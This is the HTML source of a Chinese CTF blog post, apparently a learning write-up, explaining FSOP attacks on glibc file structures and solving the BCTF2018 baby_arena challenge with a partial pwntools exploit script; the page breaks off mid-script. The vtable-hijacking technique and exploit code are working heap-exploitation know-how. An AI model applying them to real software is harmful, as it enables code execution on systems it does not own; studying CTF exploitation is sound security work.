@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a2ur2.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一、基础知识1、IO FILE的主要结构在进入正题之前，我们需要对IO FILE有一定基本了解，之前我们知道的利用unsorted bin残留指针去爆破stdout就是修改了IO FILE里面的机构，让其能输出。一般的程序都会有stdout、stdrr、stdin这三个管理数据流的IO FILE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="努力成长的pwn弟系列-【1】fsop">
+<meta property="og:url" content="https://a2ur2.github.io/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/index.html">
+<meta property="og:site_name" content="A2ur2的梦想小屋">
+<meta property="og:description" content="一、基础知识1、IO FILE的主要结构在进入正题之前，我们需要对IO FILE有一定基本了解，之前我们知道的利用unsorted bin残留指针去爆破stdout就是修改了IO FILE里面的机构，让其能输出。一般的程序都会有stdout、stdrr、stdin这三个管理数据流的IO FILE">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/02/vEBfwF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/02/vEBby6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/02/vEDKlq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/02/vEy5B6.png">
+<meta property="article:published_time" content="2022-08-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-02T08:10:53.955Z">
+<meta property="article:author" content="A2ur2">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/08/02/vEBfwF.png">
+
+<link rel="canonical" href="https://a2ur2.github.io/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>努力成长的pwn弟系列-【1】fsop | A2ur2的梦想小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">A2ur2的梦想小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我许下的愿望该向谁去说明</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="A2ur2">
+      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A2ur2的梦想小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          努力成长的pwn弟系列-【1】fsop
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-02 00:00:00 / 修改时间：16:10:53" itemprop="dateCreated datePublished" datetime="2022-08-02T00:00:00+08:00">2022-08-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1、IO-FILE的主要结构"><a href="#1、IO-FILE的主要结构" class="headerlink" title="1、IO FILE的主要结构"></a>1、IO FILE的主要结构</h3><p>在进入正题之前，我们需要对IO FILE有一定基本了解，之前我们知道的利用unsorted bin残留指针去爆破stdout就是修改了IO FILE里面的机构，让其能输出。一般的程序都会有stdout、stdrr、stdin这三个管理数据流的IO FILE</p>
+<span id="more"></span>
+<h4 id="1-1-IO-FILE-plus"><a href="#1-1-IO-FILE-plus" class="headerlink" title="1.1 IO_FILE_plus"></a>1.1 IO_FILE_plus</h4><p>每一个_IO_FILE都会被包含在IO_FILE_plus中，大致结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中的vtable是一个_IO_jump_t 类型的指针，主要用于实现各种函数的跳转，在实现函数跳转的过程中是根据这个<strong>vtable指针+固定偏移</strong>去找到对应的位置，并且执行相应的函数。因此我们不难想到可以在一个地址上写下我们的og或者system，然后伪造vtable指针，让其跳转到我们想要执行的函数，亦或者在原本的vtable区域去修改对应偏移位置的函数，从而达到一定劫持程序流的效果。</p>
+<p>_IO_jump_t的定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-FILE"><a href="#1-2-FILE" class="headerlink" title="1.2 FILE"></a>1.2 FILE</h4><p>FILE是我们IO attack里面很重要的一个结构体，很多时候要构造好一个IO FILE，才能够顺顺利利的pwn，起码不会看wp都看不懂（</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">//链接IO结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中需要注意的是flag位置，这个位置要设计好才能进入我们想要进入的函数，最常见的就是修改成0xfbad1800（我们爆破stdout去leak libc时见过），还有一个就是0（这我没遇到过，但uuu师傅说好用，那它就是好用ouo），此外，若此IO FILE的指针fp被当作参数传进函数中，那么flag就和这个参数等价（个人理解，因为有将flag位改成&#x2F;bin&#x2F;sh然后传进system里getshell的操作）</p>
+<p>其次是_chain，这是一个类似fastbin的fd指针，用于指向下一个IO FILE的。</p>
+<h4 id="1-3-IO-list-all-指针"><a href="#1-3-IO-list-all-指针" class="headerlink" title="1.3_IO_list_all 指针"></a>1.3_IO_list_all 指针</h4><p>这个指针位于libc段，记录着_IO_FILE_plus结构体的位置，就和fastbinY一样，自己脑补理解下（顺便再回忆下fastbin attack，这是下面fsop的一要点）</p>
+<h3 id="2、FSOP"><a href="#2、FSOP" class="headerlink" title="2、FSOP"></a>2、FSOP</h3><h4 id="2-1-相关函数"><a href="#2-1-相关函数" class="headerlink" title="2.1 相关函数"></a>2.1 相关函数</h4><p>FSOP的要点就在于利用  <strong>_IO_flush_all_lockp</strong> 这个函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">#遍历 _IO_list_all</span><br><span class="line">  <span class="title function_">for</span> <span class="params">(fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><span class="comment">//利用_chain遍历全部IO FILE</span></span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)		<span class="comment">//如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是_IO_flush_all_lockp的定义，从__IO_list_all指针开始，遍历完整个<strong>由chain域链接</strong>起来单链表，如果通过了if的判断，就会进入 _IO_OVERFLOW中，刷新输出缓冲区。</p>
+<p>至此，我们不难想到，可以劫持_IO_list_all或者某一个IO FILE的chain域，从而让程序遍历到我们精心伪造的堆块中，如果丧心病狂点，可以搞好多堆块来构造fake IO FILE，搞🌼活。</p>
+<h4 id="2-2-FSOP的要点"><a href="#2-2-FSOP的要点" class="headerlink" title="2.2 FSOP的要点"></a>2.2 FSOP的要点</h4><p>首先，我们需要一个_IO_flush_all_lockp函数，让程序自己把屁股敲起来我们好进去（x</p>
+<p>有三种情况会调用_IO_flush_all_lockp</p>
+<p>一、libc执行abort函数时</p>
+<p>二、程序调用exit时，_exit不行是因为它是syscall，而我们需要exit函数去调用</p>
+<p>_IO_flush_all_lockp函数</p>
+<p>三、从main函数返回，程序自行调用exit，从而调用_IO_flush_all_lockp函数</p>
+<p>总而言之就是exit！</p>
+<p>然后我们要绕过检测进入到_IO_OVERFLOW中。只需要将fake IO FILE如下布局就好</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>
+
+<p>预计攻击效果：当我们执行了_IO_flush_all_lockp后，遍历IO FILE遍历到我们的fake IO FILE上，然后通过vtable表跳转到 _我们的IO_OVERFLOW（没错，它在vtable里面），而此时这个vtable肯定是我们玩坏了的那种，最后就跳转到og或者system，最后成功getshell。</p>
+<h4 id="2-3-局限"><a href="#2-3-局限" class="headerlink" title="2.3 局限"></a>2.3 局限</h4><p>2.23版本之后，vtable表就添加了一个check， IO_validate_vtable 函数，用于检查vtable指针是否在glibc的vtable段中，如果不是则会进一步检查是否使用外部合法的vtable。所以2.23之后，我们再也不能随便的改vtable了</p>
+<h2 id="3、globe-max-fast以及fastbinY"><a href="#3、globe-max-fast以及fastbinY" class="headerlink" title="3、globe_max_fast以及fastbinY"></a>3、globe_max_fast以及fastbinY</h2><p>globe_max_fast是glibc定义的一个全局变量，用于记录fastbin最大的chunk大小，正常情况下大小为0x80。</p>
+<p>根据之前所学习的fastbin attack我们可以知道fastbinY是一个单链表的头，记录了第一个进入该大小的fastbin的堆块地址。glibc寻找对应fastbinY的位置是根据第一个fastbinY的地址加上要释放进fastbin的chunk大小作为相应偏移去寻找。</p>
+<h2 id="二、例题：baby-arena-BCTF2018"><a href="#二、例题：baby-arena-BCTF2018" class="headerlink" title="二、例题：baby_arena_BCTF2018"></a>二、例题：baby_arena_BCTF2018</h2><h3 id="1、程序分析"><a href="#1、程序分析" class="headerlink" title="1、程序分析"></a>1、程序分析</h3><p>程序主要实现了三个功能，login，malloc和delete。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/vEBfwF"><img src="https://s1.ax1x.com/2022/08/02/vEBfwF.png" alt="vEBfwF.png"></a></p>
+<p>限制了申请堆块的大小</p>
+<p>在login中，get_char(&amp;v3,16)中存在溢出可以覆盖v4，因此我们有一次任意地址写admin或者clientele的机会</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/vEBby6"><img src="https://s1.ax1x.com/2022/08/02/vEBby6.png" alt="vEBby6.png"></a></p>
+<h3 id="2、利用思路："><a href="#2、利用思路：" class="headerlink" title="2、利用思路："></a>2、利用思路：</h3><p>利用这个任意地址写admin或者clientele，我们可以将globe_max_fast改大，那么我们的大堆块在free后就会执行进入fastbin的流程，根据偏移去寻找相应的fastbinY并且将堆地址写到该地址。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/vEDKlq"><img src="https://s1.ax1x.com/2022/08/02/vEDKlq.png" alt="vEDKlq.png"></a></p>
+<p>如图，当我们的chunk大小合适，就会在fastbinsY一定偏移处写一个堆地址，联系上面的知识，我们不难想到是劫持IO_list或者是chain域，达到让程序遍历时会遍历fake IO FILE的效果。最后FSOP即可getshell</p>
+<h3 id="3、exp："><a href="#3、exp：" class="headerlink" title="3、exp："></a>3、exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls Input your note size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;note&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b free&#x27;)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">ptr</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input your name&quot;</span>,ptr)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;admin&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1400</span>,<span class="string">&#x27;1&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;your note is&quot;</span>)</span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">og=libcbase+<span class="number">0x4527a</span></span><br><span class="line">globe_max=libcbase+<span class="number">0x3c67f8</span>-<span class="number">0x8</span></span><br><span class="line">system=libcbase+<span class="number">0x453a0</span></span><br><span class="line">pause()</span><br><span class="line">login(p64(og)+p64(globe_max))</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(globe_max))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add(0x440,&#x27;&#x27;)#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span 